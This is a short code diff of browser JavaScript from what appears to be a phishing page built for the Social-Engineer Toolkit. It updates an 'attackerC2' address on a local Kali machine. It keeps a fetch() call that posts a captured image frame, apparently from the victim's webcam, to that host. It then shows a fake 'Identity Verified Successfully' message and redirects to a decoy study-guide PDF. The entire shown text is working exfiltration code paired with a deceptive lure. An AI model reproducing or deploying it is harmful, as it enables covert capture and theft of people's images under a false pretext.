@@ -66,7 +66,7 @@
                 // 3. THE EXFILTRATION (Sending it to SET)
                 // This sends the image data as a POST request back to your Kali machine
               // Ensure this is your Kali IP
-const attackerC2 = "http://192.168.2.101/post"; 
+const attackerC2 = "http://192.168.0.105/post"; 
 
 fetch(attackerC2, {
     method: 'POST',
@@ -76,6 +76,7 @@ fetch(attackerC2, {
     },
     body: "CAPTURED_FRAME=" + encodeURIComponent(imageData)
 });;
+                
 
                 alert("Identity Verified Successfully. Your PDF Study Guide is downloading now.");
                 window.location.href = "study_guide.pdf";
